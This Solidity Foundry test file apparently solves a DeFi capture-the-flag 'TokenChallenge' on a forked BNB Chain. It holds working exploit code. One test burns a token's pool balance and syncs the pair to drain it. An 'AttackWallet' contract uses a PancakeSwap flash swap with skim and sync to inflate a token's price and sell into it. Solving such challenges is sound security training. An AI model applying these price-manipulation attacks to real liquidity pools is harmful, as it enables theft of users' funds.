// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/3-token/TokenChallenge.sol";
import "../contracts/v2-periphery/interfaces/IUniswapV2Factory.sol";
import "../contracts/v2-periphery/interfaces/IUniswapV2Pair.sol";

contract TokenChallengeTest is Test {
    uint256 public constant INIT_AMOUNT = 10_000_000 ether;


    address private developer = 0xAAcF6a8119F7e11623b5A43DA638e91F669A130f;
    address private attacker = 0x11111112e8a4d889b7e66F77a2552a1d1aeBb918;
    TokenChallenge challenge;

    IUniswapV2Factory private PANCAKE_FACTORY = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    IUniswapRouter private PANCAKE_ROUTER = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc");

        vm.label(address (PANCAKE_FACTORY), 'PANCAKE_FACTORY');
        vm.label(address (PANCAKE_ROUTER), 'PANCAKE_ROUTER');
        vm.deal(attacker, 1 ether);
        vm.prank(attacker, attacker);
        challenge = new TokenChallenge();

        vm.deal(address (challenge), 1 ether);
    }

    function test_challenge_abc() public {
        console.log('balance', address(challenge).balance);
        console.log('max uint256', type(uint256).max);
        uint256 maxUint256 = type(uint256).max;

        uint256 beforeBalance = attacker.balance;
        vm.startPrank(attacker);

        challenge.register();
        address usda = challenge.usdAMap(attacker);
        address abc = challenge.abcMap(attacker);

        address[] memory path = new address[](2);
        path[0] = abc;
        path[1] = usda;

        address lp = PANCAKE_FACTORY.getPair(abc, usda);
        ABC(abc).burn(lp, ABC(abc).balanceOf(lp) * 99999999 / 100000000);
        IUniswapV2Pair(lp).sync();

        ABC(abc).approve(address(PANCAKE_ROUTER), maxUint256);
        PANCAKE_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ABC(abc).balanceOf(attacker),
            1,
            path,
            attacker,
            block.timestamp
        );

        challenge.withdraw1();
        console.log('earned', attacker.balance - beforeBalance);
        vm.stopPrank();
    }

    function test_challenge_xyz() public {
        console.log('balance', address(challenge).balance);
        console.log('max uint256', type(uint256).max);
        uint256 maxUint256 = type(uint256).max;

        uint256 beforeBalance = attacker.balance;
        vm.startPrank(attacker);

        challenge.register();
        console.log('challenge.register()');
        address usdx = challenge.usdXMap(attacker);
        address usdy = challenge.usdYMap(attacker);
        address usdz = challenge.usdZMap(attacker);
        address xyz = challenge.xyzMap(attacker);

        address[] memory path = new address[](2);
        IUniswapV2Pair lp_usdx_xyz = IUniswapV2Pair(PANCAKE_FACTORY.getPair(xyz, usdx));
        IUniswapV2Pair lp_usdy_xyz = IUniswapV2Pair(PANCAKE_FACTORY.getPair(xyz, usdy));
        IUniswapV2Pair lp_usdy_usdz = IUniswapV2Pair(PANCAKE_FACTORY.getPair(usdy, usdz));

        console.log('lp', address(lp_usdx_xyz));
        vm.label(address(lp_usdx_xyz), "USDX-XYZ-LP");

        address attackerWallet = address (new AttackWallet());
        // 1. flashloan
        uint256 lendUsdyAmount = INIT_AMOUNT * 99 / 100;
        if (lp_usdy_usdz.token0() == usdy) {
            lp_usdy_usdz.swap(lendUsdyAmount, 0, attackerWallet, abi.encode(usdx, usdy, xyz, address(lp_usdx_xyz), address(lp_usdy_xyz)));
        } else {
            lp_usdy_usdz.swap(0, lendUsdyAmount, attackerWallet, abi.encode(usdx, usdy, xyz, address(lp_usdx_xyz), address(lp_usdy_xyz)));
        }

        console.log('after attack usdy balance', USD(usdy).balanceOf(attacker));

        challenge.withdraw2();
        console.log('earned', attacker.balance - beforeBalance);
        vm.stopPrank();
    }
}

contract AttackWallet {
    IUniswapRouter private PANCAKE_ROUTER = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function attack(address usdx, address usdy, address xyz, address _lp_usdx_xyz, address _lp_usdy_xyz) public {
        console.log('start attack');

        uint256 maxUint256 = type(uint256).max;

        IUniswapV2Pair lp_usdx_xyz = IUniswapV2Pair(_lp_usdx_xyz);
        IUniswapV2Pair lp_usdy_xyz = IUniswapV2Pair(_lp_usdy_xyz);
        USD(usdx).approve(address(PANCAKE_ROUTER), maxUint256);
        USD(usdy).approve(address(PANCAKE_ROUTER), maxUint256);
        XYZ(xyz).approve(address(PANCAKE_ROUTER), maxUint256);

        // use usdy to buy xyz
        address[] memory path = new address[](2);
        path[0] = usdy;
        path[1] = xyz;
        PANCAKE_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USD(usdy).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        XYZ(xyz).transfer(_lp_usdy_xyz, XYZ(xyz).balanceOf(address(this)));
        lp_usdy_xyz.skim(_lp_usdx_xyz);
        lp_usdx_xyz.skim(address(this));

        {
            (uint256 r0, uint256 r1, ) = lp_usdy_xyz.getReserves();
            uint256 price = (lp_usdy_xyz.token0() == usdy) ? r0 * 1e18 / r1 : r1 * 1e18 / r0;
            console.log('before sync price XYZ/USDY', price / 1e17);
            console.log('before sync xyz balance', XYZ(xyz).balanceOf(address(this)));
        }
        // 5. sync = force reserve of xyz decrease, price increased
        lp_usdy_xyz.sync();

        {
            (uint256 r0, uint256 r1, ) = lp_usdy_xyz.getReserves();
            uint256 price = (lp_usdy_xyz.token0() == usdy) ? r0 * 1e18 / r1 : r1 * 1e18 / r0;
            console.log('after sync price XYZ/USDY', price / 1e17);
            console.log('after sync xyz balance', XYZ(xyz).balanceOf(address(this)));
        }

        address[] memory sellPath = new address[](2);
        sellPath[0] = xyz;
        sellPath[1] = usdy;
        XYZ(xyz).approve(address(PANCAKE_ROUTER), ~uint256(0));
        PANCAKE_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            XYZ(xyz).balanceOf(address(this)),
            1,
            sellPath,
            address(this),
            block.timestamp
        );

        console.log('after attack xyz owner balance', XYZ(xyz).balanceOf(owner));
        console.log('after attack usdx owner balance', USD(usdx).balanceOf(owner));
        console.log('after attack usdy owner balance', USD(usdy).balanceOf(owner));

        console.log('after attack xyz attackWallet balance', XYZ(xyz).balanceOf(address(this)));
        console.log('after attack usdx attackWallet balance', USD(usdx).balanceOf(address(this)));
        console.log('after attack usdy attackWallet balance', USD(usdy).balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        address _lp_usdy_usdz = msg.sender;
        IUniswapV2Pair lp_usdy_usdz = IUniswapV2Pair(_lp_usdy_usdz);

        (address usdx, address usdy, address xyz, address lp_usdx_xyz, address lp_usdy_xyz) =
            abi.decode(data, (address, address, address, address, address));

        attack(usdx, usdy, xyz, lp_usdx_xyz, lp_usdy_xyz);

        address usdz = lp_usdy_usdz.token0() == usdy ? lp_usdy_usdz.token1() : lp_usdy_usdz.token0();

        uint256 balanceY = USD(usdy).balanceOf(_lp_usdy_usdz) * 1000;
        uint256 balanceZ = USD(usdz).balanceOf(_lp_usdy_usdz) * 1000;
        (uint256 r0, uint256 r1, ) = lp_usdy_usdz.getReserves();

        uint256 returnAmountY = (r0 * r1 * 1e6 / balanceZ - balanceY) / 995;
        USD(usdy).transfer(_lp_usdy_usdz, returnAmountY);
        USD(usdy).transfer(owner, USD(usdy).balanceOf(address(this)));
    }
}
